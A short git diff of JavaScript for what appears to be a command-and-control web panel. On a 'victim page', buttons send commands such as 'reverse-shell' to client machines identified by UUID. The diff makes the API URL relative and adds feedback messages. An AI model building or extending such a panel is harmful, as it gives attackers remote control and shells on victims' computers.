@@ -30,10 +30,11 @@ $(document).ready(function ($) {
     SPECIFIC VICTIM PAGE : Buttons to submit commands via AJAX
 ----------------------------------------------------- */
 $(document).ready(function ($) {
+    
     $('.btn-command').on('click', function() {
         
         const command = JSON.stringify({ "name": $(this).data("command").toUpperCase() })
-        const url = new URL('https://pa5a.cyberfilou.fr/api/clients/' + $(this).data("uuid") + '/commands')
+        const url = new URL(window.location.origin + '/api/clients/' + $(this).data("uuid") + '/commands')
         
         $.ajax({
             type: "POST",
@@ -44,14 +45,17 @@ $(document).ready(function ($) {
         .done( (data) => {
             console.log("The AJAX request is a success !")
             console.log(data)
+            $('#commandSent').show("slow")
+            //alert("Command successfully added to the queue !")
         })
         .fail( () => {
             console.log("The AJAX request failed ...")
+            alert("An error occurred ...")
         })
 
         // If it's a shell's request, then we open the shell interface in a new tab
-        if ($(this).data("command") === "shell") {
-            const url = new URL('https://pa5a.cyberfilou.fr/app/command/shell/' + $(this).data("uuid"))
+        if ($(this).data("command") === "reverse-shell") {
+            const url = new URL(window.location.origin + '/app/command/shell/' + $(this).data("uuid"))
             window.open(url, '_blank')
         }
     });
